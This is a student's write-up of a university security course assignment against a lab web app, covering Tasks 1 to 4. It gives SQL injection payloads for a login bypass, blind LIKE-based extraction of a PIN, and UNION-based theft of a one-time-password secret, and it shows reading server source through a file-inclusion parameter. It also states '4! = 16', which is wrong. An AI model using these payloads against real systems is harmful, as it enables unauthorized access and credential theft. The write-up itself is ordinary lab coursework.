# My solution of the SQL Injection Assignment

See [the assignment here](./SQL-Injection-Assignment.md).


# Task 1

First, I entered Username `endlemar` and password `'XXX`.

Luckily, the app returned a page with an error message:

```
Wrong SQL query: SELECT username FROM users WHERE username = 'endlemar' AND password = SHA1(CONCAT(''XXX', (SELECT salt FROM users WHERE username = 'endlemar')))
```

Seeing the whole query and the position of my “password” `'XXX`, I constructed the following value for `password` that
will result one row where username is `endlemar`:

```
')) OR 1 = 1 AND username = 'endlemar' -- 
```

**Note 1:** There is a trailing space in `-- `.
**Note 2:** It seems that the entered Username in the form does not affect what the app does when using this SQL injection.


## Task 2

Using the Hint #1 (Table `users` contains column `pin`), I constructed several queries (passwords) to find out what my
4-digits PIN is.

First, I found out that my PIN contains only digits 1, 3, 5, 7 using the queries in the following form (where `<number>`
is 0,..,9).

```
')) OR 1 = 1 AND username = 'endlemar' AND pin LIKE '%<number>%' -- 
```

That meant that there is only `4! = 16` possible PINs. However, I constructed another queries to find out the digits
relative precedence to each other (the condition evaluated to TRUE when `<i>` preceded `<j>`).

```
')) OR 1 = 1 AND username = 'endlemar' AND pin LIKE '%<i>%<j>%' -- 
```

Reducing the possible number of permutations this way, I quickly discovered that my PIN is `5371`.


## Task 3

Using the following query (password), I found out my secret is `E5XVZ2XDHS4SNGE2`:

```
')) AND 1 = 0 UNION SELECT secret FROM users WHERE username = 'endlemar' -- 
```

Once I had the secret, I created a new account using the secret as “a setup key” within the mobile Google Authenticator
app so that I could generate the corresponding OTPs. The generated OTPs worked I got in.

### Side note

Originally, I wanted to use this technique (with UNION) to find out my PIN. But it turns out that the app
must have some built-in protection against it:

```
')) AND 1 = 0 UNION SELECT pin FROM users WHERE username = 'endlemar' -- 
```

It seems that even though the SQL query succeeds and returns one username, the app checks whether the returned value is
from the user's table columns `username` and/or `secret`.

The following works:

```
')) AND 1 = 0 UNION SELECT 'endlemar' as username -- 
')) AND 1 = 0 UNION SELECT 'E5XVZ2XDHS4SNGE2' as username -- 
```

But the following does NOT work:

```
')) AND 1 = 0 UNION SELECT '5371' as username -- 
')) AND 1 = 0 UNION SELECT 'something' as username -- 
```


## Task 4

Once I successfully logged in, I started exploring the UI and all its features.
I noticed the link “Warning!” which led to the URL `https://kbe.felk.cvut.cz/index.php?open=warning.txt`.
Almost immediately I tried replacing `warning.txt` with `index.php`.
And to my pleasant surprise, the server responded with a highlighted source code of the index.php.
After a quick look, I figured it must be the same index.php that is actually running on the server.

**Note 3:** In fact, no login is needed to access https://kbe.felk.cvut.cz/index.php?open=index.php.
**Note 4:** The code confirms my suspicions from [Task 3's Side note](#side-note).
